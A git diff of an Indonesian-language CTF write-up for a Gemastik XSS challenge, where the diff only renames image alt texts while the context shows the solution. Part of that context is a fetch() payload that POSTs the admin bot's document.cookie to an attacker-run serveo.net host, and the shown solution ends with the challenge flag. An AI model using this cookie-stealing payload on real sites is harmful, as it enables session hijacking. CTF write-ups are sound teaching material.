@@ -12,19 +12,19 @@
 
 Sesuai dengan deskripsi, challenge ini merupakan challenge XSS. Berdasarkan pada repository, XSS terdapat pada halaman utama yaitu http://ctf.gemastik.id:9020/ dengan parameter x pada URL.
 
-![approach](docs/index.png)
+![index](docs/index.png)
 
 Lakukan XSS sederhana dengan menambahkan `?x=alert(1)` 
 
-![about](docs/alert.png)       
+![alert](docs/alert.png)       
 
 Halaman bot admin berada pada http://ctf.gemastik.id:9020/report.
 
-![inspect](docs/adminbot.png)
+![adminbot](docs/adminbot.png)
 
 Nampaknya flag dimasukkan ke dalam cookie pada bot.
 
-![inspect](docs/bot.png).
+![bot](docs/bot.png).
 
 Selanjutnya kita akan mencoba mendapatkan cookie dari bot tersebut dengan bantuan XSS, dan dikirimkan ke HTTP Server sederhana yang akan kita buat dan diekspos menggunakan [serveo](https://serveo.net/).
 
@@ -97,10 +97,10 @@ Masukkan URL berisi payload XSS ke dalam halaman admin bot, ini akan melakukan P
 http://proxy/?x=fetch(%27https://xxx.serveo.net%27,%20{method:%20%27POST%27,%20body:%20JSON.stringify(document.cookie)})
 ```
 
-![flag](docs/submit.png)  
+![submit](docs/submit.png)  
 
 Kita mendapatkan flagnya
 
-![solver](docs/flag.png)        
+![flag](docs/flag.png)        
 
 **Flag**: `gemastik{s3lamat_anda_m3ndap4tkan_XSS}`
